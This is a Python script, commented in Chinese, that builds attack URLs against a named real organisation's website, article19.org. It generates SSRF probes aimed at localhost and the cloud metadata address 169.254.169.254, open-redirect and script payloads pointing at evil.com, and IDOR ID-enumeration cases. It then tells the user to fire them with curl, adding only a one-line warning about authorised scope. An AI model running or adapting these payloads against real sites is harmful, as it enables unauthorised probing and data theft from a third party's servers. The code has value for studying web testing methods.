#!/usr/bin/env python3
"""
生成实际可测试的payload列表
为article19.org的高价值参数生成具体测试用例
"""

import urllib.parse
from pathlib import Path

def generate_ssrf_payloads(base_url):
    """生成SSRF测试payload"""
    payloads = [
        # 内部IP探测
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        
        # 云元数据
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/",
        
        # 绕过技巧
        "http://127.1/",
        "http://0177.0.0.1/",
        "http://2130706433/",  # 127.0.0.1的十进制
        
        # DNS rebinding准备
        "http://spoofed.burpcollaborator.net/",
    ]
    
    results = []
    parsed = urllib.parse.urlparse(base_url)
    
    for payload in payloads:
        # 替换url参数值
        query_params = urllib.parse.parse_qs(parsed.query)
        if 'url' in query_params or 'URL' in query_params:
            param_name = 'url' if 'url' in query_params else 'URL'
            new_query = []
            for key, values in query_params.items():
                if key.lower() == param_name.lower():
                    new_query.append(f"{key}={urllib.parse.quote(payload, safe='')}")
                else:
                    for val in values:
                        new_query.append(f"{key}={val}")
            
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(new_query)}"
            results.append({
                'url': new_url,
                'payload': payload,
                'type': 'SSRF'
            })
    
    return results

def generate_redirect_payloads(base_url):
    """生成Open Redirect测试payload"""
    payloads = [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "https://evil.com@article19.org",
        "https://article19.org.evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]
    
    results = []
    parsed = urllib.parse.urlparse(base_url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    redirect_params = ['redirect', 'return', 'next', 'callback', 'url']
    
    for param_name in redirect_params:
        if param_name in query_params:
            for payload in payloads:
                new_query = []
                for key, values in query_params.items():
                    if key == param_name:
                        new_query.append(f"{key}={urllib.parse.quote(payload, safe='')}")
                    else:
                        for val in values:
                            new_query.append(f"{key}={val}")
                
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(new_query)}"
                results.append({
                    'url': new_url,
                    'payload': payload,
                    'type': 'Open Redirect'
                })
            break
    
    return results

def generate_idor_test_cases(base_url):
    """生成IDOR测试用例"""
    results = []
    parsed = urllib.parse.urlparse(base_url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    id_params = ['id', 'AreaID', 'tagid', 'uid', 'user_id']
    
    for param_name in id_params:
        if param_name in query_params:
            original_id = query_params[param_name][0]
            
            # 生成测试ID
            test_ids = [
                str(int(original_id) + 1) if original_id.isdigit() else "999",
                str(int(original_id) - 1) if original_id.isdigit() else "1",
                "0",
                "1",
                "-1",
            ]
            
            for test_id in test_ids:
                new_query = []
                for key, values in query_params.items():
                    if key == param_name:
                        new_query.append(f"{key}={test_id}")
                    else:
                        for val in values:
                            new_query.append(f"{key}={val}")
                
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(new_query)}"
                results.append({
                    'url': new_url,
                    'original_id': original_id,
                    'test_id': test_id,
                    'type': 'IDOR'
                })
            break
    
    return results

def main():
    target = "article19.org"
    input_dir = Path(f"hunt_targets/{target}")
    output_dir = Path(f"hunt_targets/{target}/payloads")
    output_dir.mkdir(exist_ok=True)
    
    print(f"=== 生成测试Payload - {target} ===\n")
    
    # 1. SSRF payloads
    print("1. 生成SSRF测试payload")
    url_file = input_dir / "url_param_top50.txt"
    if url_file.exists():
        urls = url_file.read_text().strip().split('\n')[:10]  # Top 10
        
        all_ssrf = []
        for url in urls:
            if url.strip():
                payloads = generate_ssrf_payloads(url.strip())
                all_ssrf.extend(payloads)
        
        output_file = output_dir / "ssrf_payloads.txt"
        with open(output_file, 'w') as f:
            for item in all_ssrf[:50]:  # Limit to 50
                f.write(f"{item['url']}\n")
        
        print(f"  ✓ 生成 {len(all_ssrf[:50])} 个SSRF payload")
        print(f"  ✓ 保存到: {output_file}")
        print(f"  示例:")
        for item in all_ssrf[:2]:
            print(f"    {item['url']}")
    
    print()
    
    # 2. Open Redirect payloads
    print("2. 生成Open Redirect测试payload")
    redirect_file = input_dir / "redirect_param_top30.txt"
    if redirect_file.exists():
        urls = redirect_file.read_text().strip().split('\n')[:10]
        
        all_redirects = []
        for url in urls:
            if url.strip():
                payloads = generate_redirect_payloads(url.strip())
                all_redirects.extend(payloads)
        
        output_file = output_dir / "redirect_payloads.txt"
        with open(output_file, 'w') as f:
            for item in all_redirects[:50]:
                f.write(f"{item['url']}\n")
        
        print(f"  ✓ 生成 {len(all_redirects[:50])} 个Redirect payload")
        print(f"  ✓ 保存到: {output_file}")
        print(f"  示例:")
        for item in all_redirects[:2]:
            print(f"    {item['url']}")
    
    print()
    
    # 3. IDOR test cases
    print("3. 生成IDOR测试用例")
    id_file = input_dir / "id_param_top50.txt"
    if id_file.exists():
        urls = id_file.read_text().strip().split('\n')[:10]
        
        all_idor = []
        for url in urls:
            if url.strip():
                test_cases = generate_idor_test_cases(url.strip())
                all_idor.extend(test_cases)
        
        output_file = output_dir / "idor_test_cases.txt"
        with open(output_file, 'w') as f:
            for item in all_idor[:50]:
                f.write(f"{item['url']} # Original ID: {item['original_id']} -> Test ID: {item['test_id']}\n")
        
        print(f"  ✓ 生成 {len(all_idor[:50])} 个IDOR测试用例")
        print(f"  ✓ 保存到: {output_file}")
        print(f"  示例:")
        for item in all_idor[:2]:
            print(f"    {item['url']}")
    
    print()
    print("=== Payload生成完成 ===")
    print(f"输出目录: {output_dir}/")
    print()
    print("下一步: 使用curl或浏览器测试这些payload")
    print("警告: 仅在授权范围内测试")

if __name__ == '__main__':
    main()
